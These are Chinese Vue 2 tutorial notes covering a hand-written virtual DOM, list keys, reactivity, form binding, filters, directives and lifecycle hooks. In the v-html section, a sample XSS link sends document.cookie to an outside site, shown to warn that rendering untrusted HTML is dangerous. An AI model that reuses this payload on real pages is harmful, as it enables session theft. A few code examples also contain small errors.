> 接下来我们手动实现下 虚拟 DOM。
>
> 分两种实现方式：
>
> 一种原生 js DOM 操作实现；
>
> 另一种主流虚拟 DOM 库（snabbdom、virtual-dom）的实现（用h函数渲染）（暂时还不理解）



**算法实现**

**（1）**用 JS 对象模拟 DOM 树：

```html
<div id="virtual-dom">
    <p>Virtual DOM</p>
    <ul id="list">
      <li class="item">Item 1</li>
      <li class="item">Item 2</li>
      <li class="item">Item 3</li>
    </ul>
    <div>Hello World</div>
</div> 
```

我们用 `JavaScript` 对象来表示 `DOM` 节点，使用对象的属性记录节点的类型、属性、子节点等。

```js
/**
 * Element virdual-dom 对象定义
 * @param {String} tagName - dom 元素名称
 * @param {Object} props - dom 属性
 * @param {Array<Element|String>} - 子节点
 */
function Element(tagName, props, children) {
    this.tagName = tagName;
    this.props = props;
    this.children = children;
    // dom 元素的 key 值，用作唯一标识符
    if (props.key) {
        this.key = props.key
    }
}
function el(tagName, props, children) {
    return new Element(tagName, props, children);
}
```

构建虚拟的  `DOM`  ，用 javascript 对象来表示

```js
let ul = el('div', { id: 'Virtual DOM' }, [
    el('p', {}, ['Virtual DOM']),
    el('ul', { id: 'list' }, [
        el('li', { class: 'item' }, ['Item 1']),
        el('li', { class: 'item' }, ['Item 2']),
        el('li', { class: 'item' }, ['Item 3'])
    ]),
    el('div', {}, ['Hello, World'])
])
```

现在 `ul` 就是我们用 `JavaScript` 对象表示的 `DOM` 结构，我们输出查看 `ul` 对应的数据结构如下：

![在这里插入图片描述](https://img-blog.csdnimg.cn/9fb2a6336a61477c8ea39677716d1f52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


**（2）**将用 js 对象表示的虚拟 DOM 转换成真实 DOM：需要用到 js 原生操作 DOM 的方法。

```js
/**
 * render 将virdual-dom 对象渲染为实际 DOM 元素
 */
Element.prototype.render = function () {
    // 创建节点
    let el = document.createElement(this.tagName);

    let props = this.props;
    // 设置节点的 DOM 属性
    for (let propName in props) {
        let propValue = props[propName];
        el.setAttribute(propName, propValue)
    }

    let children = this.children || []
    for (let child of children) {
        let childEl = (child instanceof Element)
        ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
        : document.createTextNode(child) // 如果是文本，就构建文本节点

        el.appendChild(childEl);
    }

    return el;
}
```

我们通过查看以上 `render` 方法，会根据 `tagName` 构建一个真正的 `DOM` 节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。

我们将构建好的 `DOM` 结构添加到页面 `body` 上面，如下：

```js
let ulRoot = ul.render();
document.body.appendChild(ulRoot);
```

这样，页面 `body` 里面就有真正的 `DOM` 结构，效果如下图所示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/41bf566f214f4c1f943b9a3dddfc6f19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_19,color_FFFFFF,t_70,g_se,x_16)




> 我们知道虚拟 DOM 的好处和虚拟 DOM 的实现后就要讲讲 key 的作用了。
>
> 贴一下上面实现地完整代码

```html
<script>
    /**
         * Element virdual-dom 对象定义
         * @param {String} tagName - dom 元素名称
         * @param {Object} props - dom 属性
         * @param {Array<Element|String>} - 子节点
         */
    function Element(tagName, props, children) {
        this.tagName = tagName;
        this.props = props;
        this.children = children;
        // dom 元素的 key 值，用作唯一标识符
        if (props.key) {
            this.key = props.key
        }
    }

    function el(tagName, props, children) {
        return new Element(tagName, props, children);
    }

    let ul = el('div', { id: 'Virtual DOM' }, [
        el('p', {}, ['Virtual DOM']),
        el('ul', { id: 'list' }, [
            el('li', { class: 'item' }, ['Item 1']),
            el('li', { class: 'item' }, ['Item 2']),
            el('li', { class: 'item' }, ['Item 3'])
        ]),
        el('div', {}, ['Hello, World'])
    ])

    /**
             * render 将virdual-dom 对象渲染为实际 DOM 元素
             */
    Element.prototype.render = function () {
        // 创建节点
        let el = document.createElement(this.tagName);

        let props = this.props;
        // 设置节点的 DOM 属性
        for (let propName in props) {
            let propValue = props[propName];
            el.setAttribute(propName, propValue)
        }

        let children = this.children || []
        for (let child of children) {
            let childEl = (child instanceof Element)
            ? child.render() // 如果子节点也是虚拟 DOM, 递归构建 DOM 节点
            : document.createTextNode(child) // 如果是文本，就构建文本节点

            el.appendChild(childEl);
        }

        return el;
    }

    let ulRoot = ul.render();
    document.body.appendChild(ulRoot);
    console.log(ul);
</script>
```







#### **虚拟DOM中key的作用**

key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

* 旧虚拟DOM中找到了与新虚拟DOM相同的key：
  * ①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
  * ②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
* 旧虚拟DOM中未找到与新虚拟DOM相同的key
  * 创建新的真实DOM，随后渲染到到页面。



> 好了，我们知道了最简单的key的原理，如果要继续研究下去就要涉及到vue的核心之一-Diff算法，后面会详细介绍。



### 用index作为key可能会引发的问题：

**若对数据进行：逆序添加、逆序删除等破坏顺序操作：**

会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。



> 案例

```html
<!-- 准备好一个容器-->
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表（遍历数组）</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <li v-for="(p,index) of persons" :key="index">
            {{p.name}}-{{p.age}}
            <input type="text">
        </li>
    </ul>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false

	new Vue({
		el: '#root',
		data: {
			persons: [
				{ id: '001', name: '张三', age: 18 },
				{ id: '002', name: '李四', age: 19 },
				{ id: '003', name: '王五', age: 20 }
			]
		},
		methods: {
			add() {
				const p = { id: '004', name: '老刘', age: 40 }
				this.persons.unshift(p)
			}
		},
	});
</script>
```

> 解释：

初始数据

persons: [
		{ id: '001', name: '张三', age: 18 },
		{ id: '002', name: '李四', age: 19 },
		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

初始虚拟 DOM 

```html
<li key='0'>张三-18<input type="text"></li>
<li key='1'>李四-19<input type="text"></li>
<li key='2'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![在这里插入图片描述](https://img-blog.csdnimg.cn/ac320c177da8496785f7b94e54dd938a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_13,color_FFFFFF,t_70,g_se,x_16)


`this.persons.unshift({ id: '004', name: '老刘', age: 40 })`

在 persons 数组最前面添加上 { id: '004', name: '老刘', age: 40 }

新数据：

persons: [

		{ id: '004', name: '老刘', age: 40 },
	
		{ id: '001', name: '张三', age: 18 },
		{ id: '002', name: '李四', age: 19 },
		{ id: '003', name: '王五', age: 20 }
]

**vue根据数据生成虚拟 DOM**

新虚拟 DOM

```html
<li key='0'>老刘-30<input type="text"></li>
<li key='1'>张三-18<input type="text"></li>
<li key='3'>李四-19<input type="text"></li>
<li key='4'>王五-20<input type="text"></li>
```

**将虚拟 DOM 转为 真实 DOM** 

![在这里插入图片描述](https://img-blog.csdnimg.cn/2ec092bf1dca430c9d9b7bf932587501.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_15,color_FFFFFF,t_70,g_se,x_16)




因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实 DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。

> 来张尚硅谷的图

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec80a7ae139642d09d70e77ca37e0a52.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




**如果结构中还包含输入类的DOM：**

会产生错误DOM更新 ==> 界面有问题。

> 这回造成的就不是性能浪费了，会直接导致页面的错误

![在这里插入图片描述](https://img-blog.csdnimg.cn/c89eb1802c7a4698ba5b14ab0ab654d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_16,color_FFFFFF,t_70,g_se,x_16)




### 结论：

* 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
* 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的



> 来张尚硅谷的图，正经使用 key

![在这里插入图片描述](https://img-blog.csdnimg.cn/e5b3f8a66d7441e5bcff0a2525266759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)






## 1.14 vue 监测data 中的 数据

先来个案例引入一下：

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <button @click="updateMei">更新马冬梅的信息</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul> 
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'马冬梅',age:30,sex:'女'},
                {id:'002',name:'周冬雨',age:31,sex:'女'},
                {id:'003',name:'周杰伦',age:18,sex:'男'},
                {id:'004',name:'温兆伦',age:19,sex:'男'}
            ]
        },
        methods: {
            updateMei(){
                // this.persons[0].name = '马老师' //奏效
                // this.persons[0].age = 50 //奏效
                // this.persons[0].sex = '男' //奏效
                this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
                // this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
            }
        }
    }) 

</script>
```

点击更新马冬梅的信息，马冬梅的数据并没有发生改变。

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f16b316d8824ca897e55c70884463de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


我们来看看控制台：
![在这里插入图片描述](https://img-blog.csdnimg.cn/145a2298bba942c78f8d23f03fb21bdf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


控制台上的数据发生了改变，说明，这个更改的数据并没有被 vue 监测到。

所以我们来研究一下 Vue 监测的原理。

我们先研究 Vue 如何监测 对象里的数据

> 代码

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            name:'浙江师范大学',
            address:'金华',
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                friends:[
                    {name:'jerry',age:35}
                ]
            }
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/024cbd8a706c451e9a1f6cc3916e426e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


> 讲一下解析模板后面的操作---》调用 set 方法时，就会去解析模板----->生成新的虚拟 DOM----->新旧DOM 对比 -----> 更新页面

模拟一下 vue 中的 数据监测

```html
<script type="text/javascript" >

    let data = {
        name:'尚硅谷',
        address:'北京',
    }

    //创建一个监视的实例对象，用于监视data中属性的变化
    const obs = new Observer(data)		
    console.log(obs)	

    //准备一个vm实例对象
    let vm = {}
    vm._data = data = obs

    function Observer(obj){
        //汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        //遍历
        keys.forEach((k) => {
            Object.defineProperty(this, k, {
                get() {
                    return obj[k]
                },
                set(val) {
                    console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                    obj[k] = val
                }
            })
        })
    }
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/250a6e7fa0da45608997f2688e143d45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


**Vue.set 的使用**

Vue.set(target，propertyName/index，value) 或

vm.$set(target，propertyName/index，value)

**用法**：

向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `vm.myObject.newProperty = 'hi'`)

> 代码

```html
<!-- 准备好一个容器-->
<div id="root">
    <h1>学生信息</h1>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                // Vue.set(this.student,'sex','男')
                this.$set(this.student,'sex','男')
            }
        }
    })
</script>
```

Vue.set() 或 vm.$set 有缺陷：

![在这里插入图片描述](https://img-blog.csdnimg.cn/954f0312289748c189bac545b4463c63.png)


> 就是 vm 和 _data 



看完了 vue 监测对象中的数据，再来看看 vue 如何监测 数组里的数据

> 先写个代码案例

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>爱好</h2>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h2>朋友们</h2>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:
            student:{
                name:'tom',
                age:{
                    rAge:40,
                    sAge:29,
                },
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2f270e6fed4408fb6709e960aea7953.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


> 所以我们通过 vm._data.student.hobby[0] = 'aaa' // 不奏效
>
> vue 监测在数组那没有 getter 和 setter，所以监测不到数据的更改，也不会引起页面的更新

![在这里插入图片描述](https://img-blog.csdnimg.cn/0e4c3d70f3e3492baaa2f391b0c26ec0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)

既然 vue 在对数组无法通过 getter 和 setter 进行数据监视，那 vue 到底如何监视数组数据的变化呢？

vue对数组的监测是通过 包装数组上常用的用于修改数组的方法来实现的。

vue官网的解释：

![在这里插入图片描述](https://img-blog.csdnimg.cn/b003a83d94dd44e0ae93a87da8ab43d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


 **总结：**

Vue监视数据的原理：

* vue会监视data中所有层次的数据

* 如何监测对象中的数据？

  通过setter实现监视，且要在new Vue时就传入要监测的数据。

  * 对象中后追加的属性，Vue默认不做响应式处理

  * 如需给后添加的属性做响应式，请使用如下API：

    Vue.set(target，propertyName/index，value) 或 

    vm.$set(target，propertyName/index，value)

* 如何监测数组中的数据？

  通过包裹数组更新元素的方法实现，本质就是做了两件事：

  * 调用原生对应的方法对数组进行更新
  * 重新解析模板，进而更新页面

* 在Vue修改数组中的某个元素一定要用如下方法：

  * 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
  * Vue.set() 或 vm.$set()



> 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！



## 1.15 收集表单数据

若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                account:'',
                password:'',
                age:18,
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female">
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                sex:'female'
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```



若：<input type="checkbox"/>

* 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
* 配置input的value属性:
  * v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
  * v-model的初始值是数组，那么收集的的就是value组成的数组



```html
<!-- 准备好一个容器-->
<div id="root">
    <form @submit.prevent="demo">
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{
                hobby:[],
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/74583240fa094967b19441921634b304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




> 备注：v-model的三个修饰符：
>
> lazy：失去焦点再收集数据
>
> number：输入字符串转为有效的数字
>
> trim：输入首尾空格过滤

## 1.16 过滤器（非重点）

定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

**语法：**

* 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
* 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"



```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性实现 -->
    <h3>现在是：{{ fmtTime }}</h3>
    <!-- methods实现 -->
    <h3>现在是：{{ getFmtTime() }}</h3>
    <!-- 过滤器实现 -->
    <h3>现在是：{{time | timeFormater}}</h3>
    <!-- 过滤器实现（传参） -->
    <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
    <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，尚硅谷'
        },
        computed: {
            fmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
            }
        },
        //局部过滤器
        filters:{
            timeFormater(value, str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })
</script>
```



> 备注：
>
> 1.过滤器也可以接收额外参数、多个过滤器也可以串联
>
> 2.并没有改变原本的数据, 是产生新的对应的数据





## 1.17 内置指令

**v-text指令：**(使用的比较少)

1.作用：向其所在的节点中渲染文本内容。

2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-text="name"></div>
    <div v-text="str"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>'
        }
    })
</script>
```

**v-html指令：**(使用的很少)

1.作用：向指定节点中渲染包含html结构的内容。

2.与插值语法的区别：

* v-html会替换掉节点中所有的内容，{{xx}}则不会。
* v-html可以识别html结构。

3.严重注意：v-html有安全性问题！！！！

* 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
* 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```js
<!-- 准备好一个容器-->
<div id="root">
    <div>你好，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'张三',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
```

**v-cloak指令（没有值）：**

* 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
* 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>

<script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        }
    })
</script>
```

**v-once指令：**(用的少)

* v-once所在节点在初次动态渲染后，就视为静态内容了。
* 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-once>初始化的n值是:{{ n }}</h2>
    <h2>当前的n值是:{{ n }}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

**v-pre指令：**(比较没用)

* 跳过其所在节点的编译过程
* 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 >当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```





## 1.18 自定义指令

需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

**语法：**

局部指令：

```js
directives: {
  focus: {
    // 指令的定义
    inserted: function (el) {
      el.focus()
    }
  }
}
```

全局指令：

```html
<script>
    // 注册一个全局自定义指令 `v-focus`
    Vue.directive('focus', {
        // 当被绑定的元素插入到 DOM 中时……
        inserted: function (el) {
            // 聚焦元素
            el.focus()
        }
    })
</script>
```

配置对象中常用的3个回调：

* bind：指令与元素成功绑定时调用。
* inserted：指令所在元素被插入页面时调用。
* update：指令所在模板结构被重新解析时调用。

> 理解这三个的调用时机，需要进一步了解 vue 的生命周期，下面会介绍。



定义全局指令

```html
<!-- 准备好一个容器-->
<div id="root">
    <input type="text" v-fbind:value="n">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //定义全局指令
    Vue.directive('fbind', {
        // 指令与元素成功绑定时（一上来）
        bind(element, binding){
            element.value = binding.value
        },
        // 指令所在元素被插入页面时
        inserted(element, binding){
            element.focus()
        },
        // 指令所在的模板被重新解析时
        update(element, binding){
            element.value = binding.value
        }
    })
    
    new Vue({
        el:'#root',
        data:{
            name: '尚硅谷',
            n: 1
        }
    })

</script>
```



局部指令：

```js
new Vue({
    el: '#root',
    data: {
        name:'尚硅谷',
        n:1
    },
    directives: {
        // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
        big (element,binding){
            console.log('big',this) //注意此处的this是window
            // console.log('big')
            element.innerText = binding.value * 10
        },
        fbind: {
            //指令与元素成功绑定时（一上来）
            bind (element,binding){
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted (element,binding){
                element.focus()
            },
            //指令所在的模板被重新解析时
            update (element,binding){
                element.value = binding.value
            }
        }
    }
})
```



## 1.19 生命周期

### 简介生命周期

Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -> 渲染、更新 -> 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。 

先来一张尚硅谷的图：

![在这里插入图片描述](https://img-blog.csdnimg.cn/e4a8169c832443f2a78c6a1ae42a87b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


1. **beforeCreate（创建前）**：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。
2. **created（创建后）**：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 `$el`属性。
3. **beforeMount（挂载前）**：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。
4. **mounted（挂载后）**：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等
5. **beforeUpdate（更新前）**：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。
6. **updated（更新后）** ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。
7. **beforeDestroy（销毁前）**：实例销毁之前调用。这一步，实例仍然完全可用，`this` 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。
8. **destroyed（销毁后）**：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。



> 来讲一下图中间大框框的内容

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf970362485848798ab093430b4162b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


先判断有没有 **el** 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 **el** 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。

没编译前的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d2242a275b1c4abe98fbcf9623ff8152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


编译后：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c59b4bb3820404f87adf366e8582f91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




这个 template 有啥用咧？

**第一种情况，有 template：**

如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。

